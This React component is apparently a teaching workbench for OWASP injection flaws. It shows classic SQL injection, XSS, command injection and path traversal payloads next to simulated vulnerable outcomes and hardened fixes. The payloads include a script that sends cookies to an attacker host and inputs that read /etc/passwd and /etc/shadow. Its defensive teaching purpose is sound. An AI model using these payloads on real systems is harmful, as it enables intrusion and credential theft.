"use client";

import { useState, useId } from "react";

type ExploitCategory = "sqli" | "xss" | "cmdi" | "pathtraversal";

interface ExploitPreset {
  category: ExploitCategory;
  name: string;
  payload: string;
  targetContext: string;
  vulnerableOutcome: string;
  hardenedOutcome: string;
  mitigationRule: string;
}

const PRESETS: ExploitPreset[] = [
  {
    category: "sqli",
    name: "Classic SQLi Auth Bypass",
    payload: "' OR '1'='1' --",
    targetContext: "SELECT * FROM users WHERE username = '{PAYLOAD}' AND password = '{HASH}'",
    vulnerableOutcome: "Auth bypassed! Query evaluated as: WHERE username = '' OR '1'='1' -- ... Returned administrator session token.",
    hardenedOutcome: "Safe: Parameterized query (db.query('SELECT * FROM users WHERE username = $1', [payload])). Payload treated strictly as literal string. 0 rows returned.",
    mitigationRule: "Use Prepared Statements with Parameterized Query Bindings. Never concatenate untrusted strings into SQL statements.",
  },
  {
    category: "sqli",
    name: "UNION SELECT Data Exfiltration",
    payload: "1 UNION SELECT id, username, password_hash, email FROM accounts --",
    targetContext: "SELECT id, title, price FROM products WHERE category_id = {PAYLOAD}",
    vulnerableOutcome: "Exfiltration successful! Database returned schema metadata and secret password hashes appended to product catalog rows.",
    hardenedOutcome: "Safe: Type validation enforced category_id as integer (NaN rejected). Query executed via prepared statement ($1).",
    mitigationRule: "Enforce strict type-casting on numeric parameters and implement database Least Privilege access controls.",
  },
  {
    category: "xss",
    name: "Reflected Script Tag Injection",
    payload: "<script>fetch('https://attacker.io/steal?c='+document.cookie)</script>",
    targetContext: "<div>Search results for: {PAYLOAD}</div>",
    vulnerableOutcome: "XSS executed in victim browser! Unescaped script tag loaded, extracted session cookies, and transmitted them to remote exfiltration server.",
    hardenedOutcome: "Safe: Context-aware HTML entity encoding transformed '<' to '&lt;' and '>' to '&gt;'. Rendered as visible harmless text.",
    mitigationRule: "Employ Context-Aware HTML Entity Encoding (e.g. DOMPurify, React JSX auto-escaping) and strict Content Security Policy (CSP).",
  },
  {
    category: "xss",
    name: "Event Handler Tag Bypass",
    payload: "<img src=x onerror=alert(document.domain)>",
    targetContext: "<p>User biography: {PAYLOAD}</p>",
    vulnerableOutcome: "Exploit triggered! Image src failed to load, invoking arbitrary JavaScript in onerror callback within current origin context.",
    hardenedOutcome: "Safe: Attribute sanitization stripped dangerous onerror event handlers and disallowed javascript: URIs via strict HTML sanitizer.",
    mitigationRule: "Sanitize rich HTML markup with an allowlist parser and set HttpOnly + SameSite=Strict cookie flags.",
  },
  {
    category: "cmdi",
    name: "Semicolon Command Chaining",
    payload: "8.8.8.8; cat /etc/passwd",
    targetContext: "exec(`ping -c 1 ${PAYLOAD}`)",
    vulnerableOutcome: "Remote code execution! Shell parsed semicolon as command delimiter; ping completed and sensitive /etc/passwd user records were dumped.",
    hardenedOutcome: "Safe: Child process executed via execFile('ping', ['-c', '1', ip]) avoiding the system shell. Input validated against IPv4 regex.",
    mitigationRule: "Avoid invoking shell interpreters (sh, bash, cmd.exe). Pass arguments as typed arrays to execFile or spawn without shell: true.",
  },
  {
    category: "pathtraversal",
    name: "Directory Traversal Sequence",
    payload: "../../../../etc/shadow",
    targetContext: "fs.readFileSync(path.join('/var/www/uploads', PAYLOAD))",
    vulnerableOutcome: "System files read! Relative traversal sequences broke out of the uploads directory sandbox and retrieved shadow password hashes.",
    hardenedOutcome: "Safe: Canonical path verified with path.resolve() ensuring the resolved path starts with the base sandbox directory.",
    mitigationRule: "Resolve canonical absolute paths and verify they reside within the intended directory root before accessing the filesystem.",
  },
];

export function AppSecSanitizerWorkbench() {
  const customPayloadInputId = useId();
  const [selectedPresetIdx, setSelectedPresetIdx] = useState<number>(0);
  const [customPayload, setCustomPayload] = useState<string>(PRESETS[0].payload);

  const preset = PRESETS[selectedPresetIdx];

  const handlePresetSelect = (idx: number) => {
    setSelectedPresetIdx(idx);
    setCustomPayload(PRESETS[idx].payload);
  };

  // HTML Entity Encoding helper
  const encodeHtml = (str: string) => {
    return str
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;")
      .replace(/'/g, "&#39;");
  };

  return (
    <div className="p-4 sm:p-6 rounded-xl border border-[var(--zen-border)] bg-[var(--zen-card)] universe-card text-[var(--zen-frost)]">
      {/* Header */}
      <div className="flex flex-wrap items-center justify-between gap-3 mb-5 border-b border-[var(--zen-border)] pb-3">
        <div>
          <span className="text-[10px] font-mono tracking-widest uppercase text-[var(--zen-cyan)] font-semibold">
            CYBERSECURITY WORKBENCH // APPLICATION SECURITY & EXPLOIT ANALYSIS
          </span>
          <h4 className="text-base sm:text-lg font-bold text-[var(--zen-snow)] tracking-wider uppercase">
            OWASP Exploit Sanitizer & Defense Studio
          </h4>
        </div>
        <div className="flex items-center gap-1.5 font-mono text-xs">
          <span className="text-[var(--zen-ink-muted)]">STANDARD:</span>
          <span className="px-2 py-0.5 rounded border border-rose-500/40 bg-rose-500/20 text-rose-300 font-bold">
            OWASP TOP 10 (A03: Injection)
          </span>
        </div>
      </div>

      {/* Preset Vectors */}
      <div className="mb-5">
        <span className="text-[10px] font-mono uppercase text-[var(--zen-ink-muted)] tracking-wider block mb-2">
          EXPLOIT VECTOR PRESETS:
        </span>
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2">
          {PRESETS.map((p, idx) => (
            <button
              key={p.name}
              onClick={() => handlePresetSelect(idx)}
              className={`p-2 rounded text-left font-mono text-xs border transition-all ${
                selectedPresetIdx === idx
                  ? "border-[var(--zen-cyan)] bg-[var(--zen-cyan)]/20 text-[var(--zen-snow)] font-bold shadow-[0_0_10px_rgba(0,229,255,0.2)]"
                  : "border-[var(--zen-border)] bg-[var(--zen-void)]/60 text-[var(--zen-ink-muted)] hover:text-[var(--zen-snow)]"
              }`}
            >
              <span className="text-[9px] uppercase block text-[var(--zen-cyan)]">{p.category}</span>
              <span className="truncate block mt-0.5">{p.name}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Payload Editor */}
      <div className="p-4 rounded-lg border border-[var(--zen-border)] bg-[var(--zen-void)]/80 mb-6 font-mono text-xs space-y-3">
        <div className="flex items-center justify-between">
          <label htmlFor={customPayloadInputId} className="text-[10px] uppercase text-[var(--zen-ink-muted)] block">
            INTERACTIVE ATTACK PAYLOAD INPUT
          </label>
          <span className="text-[10px] text-rose-400 font-bold uppercase">UNTRUSTED USER INPUT</span>
        </div>
        <input
          id={customPayloadInputId}
          type="text"
          value={customPayload}
          onChange={(e) => setCustomPayload(e.target.value)}
          className="w-full bg-[var(--zen-card)] border border-[var(--zen-border)] rounded px-3 py-2 text-sm text-rose-300 font-bold focus:outline-none focus:border-[var(--zen-cyan)]"
        />
        <div className="text-[11px] text-[var(--zen-ink-muted)]">
          Target Execution Context: <code className="text-[var(--zen-snow)]">{preset.targetContext}</code>
        </div>
      </div>

      {/* Side-by-Side Dual Pipeline Breakdown */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        {/* Vulnerable Pipeline */}
        <div className="p-4 rounded-lg border border-rose-500/40 bg-rose-500/5 space-y-3 font-mono text-xs">
          <div className="flex items-center justify-between border-b border-rose-500/30 pb-2">
            <span className="text-xs font-bold text-rose-400 uppercase tracking-wider">
              VULNERABLE EXECUTION PATH
            </span>
            <span className="px-2 py-0.5 rounded bg-rose-500/20 text-rose-300 text-[10px] font-bold">
              UNSANITIZED
            </span>
          </div>

          <div>
            <span className="text-[10px] text-[var(--zen-ink-muted)] uppercase block mb-1">Interpolated Query / Command:</span>
            <div className="p-2.5 rounded bg-[var(--zen-void)] border border-rose-500/30 text-rose-200 overflow-x-auto whitespace-pre-wrap">
              {preset.targetContext.replace("{PAYLOAD}", customPayload)}
            </div>
          </div>

          <div className="pt-2 border-t border-rose-500/20">
            <span className="text-[10px] text-rose-400 uppercase block font-bold mb-1">Simulated Exploit Outcome:</span>
            <p className="text-[11px] text-[var(--zen-snow)]/90 font-sans leading-relaxed">
              {preset.vulnerableOutcome}
            </p>
          </div>
        </div>

        {/* Hardened Defense Pipeline */}
        <div className="p-4 rounded-lg border border-emerald-500/40 bg-emerald-500/5 space-y-3 font-mono text-xs">
          <div className="flex items-center justify-between border-b border-emerald-500/30 pb-2">
            <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider">
              HARDENED DEFENSIVE PIPELINE
            </span>
            <span className="px-2 py-0.5 rounded bg-emerald-500/20 text-emerald-300 text-[10px] font-bold">
              PARAMETERIZED & ESCAPED
            </span>
          </div>

          <div>
            <span className="text-[10px] text-[var(--zen-ink-muted)] uppercase block mb-1">Sanitized Representation:</span>
            <div className="p-2.5 rounded bg-[var(--zen-void)] border border-emerald-500/30 text-emerald-200 overflow-x-auto whitespace-pre-wrap">
              {preset.category === "xss" ? encodeHtml(customPayload) : `[Bound Parameter $1]: "${customPayload}"`}
            </div>
          </div>

          <div className="pt-2 border-t border-emerald-500/20">
            <span className="text-[10px] text-emerald-400 uppercase block font-bold mb-1">Defensive Countermeasure:</span>
            <p className="text-[11px] text-[var(--zen-snow)]/90 font-sans leading-relaxed">
              {preset.hardenedOutcome}
            </p>
          </div>
        </div>
      </div>

      {/* Security Mitigation Guidelines */}
      <div className="p-4 rounded-lg border border-[var(--zen-border)] bg-[var(--zen-void)]/60 font-mono text-xs space-y-1.5">
        <span className="text-[10px] text-[var(--zen-cyan)] uppercase font-semibold block">
          SECURE CODING MITIGATION DIRECTIVE
        </span>
        <p className="text-[11px] text-[var(--zen-frost)]/80 font-sans leading-relaxed">
          {preset.mitigationRule}
        </p>
      </div>
    </div>
  );
}
